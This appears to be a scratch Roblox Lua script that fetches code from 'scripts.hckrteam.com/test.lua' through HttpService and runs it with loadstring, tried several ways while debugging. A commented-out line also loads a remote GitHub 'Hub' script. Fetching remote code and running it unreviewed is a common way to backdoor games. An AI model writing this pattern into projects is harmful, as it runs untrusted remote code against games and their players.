local code = game:GetService("HttpService"):GetAsync("https://scripts.hckrteam.com/test.lua")
local res, err = pcall(function()
	warn()
	return loadstring(code)
end)

warn(res)

warn(err)

warn(code)

loadstring(code)

local executable, compileFailReason = loadstring(tostring(code))

warn(executable, compileFailReason)

if err then
	print(err)
else
	print("RESULT", res)
end


local HttpService = game:GetService("HttpService")
--local code = HttpService:GetAsync("https://scripts.hckrteam.com/test.lua", true)
--local f = loadstring(code)
--f()



loadstring(HttpService:GetAsync("https://scripts.hckrteam.com/test.lua", true))

--pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/samuelrblx/Bruhnhe/main/Hub"))() end)


local function loadscript(url)
	local HttpService = game:GetService("HttpService")
	local code = HttpService:GetAsync(url, true)
	local load = loadstring(code)
	load()
end


loadscript("https://scripts.hckrteam.com/test.lua")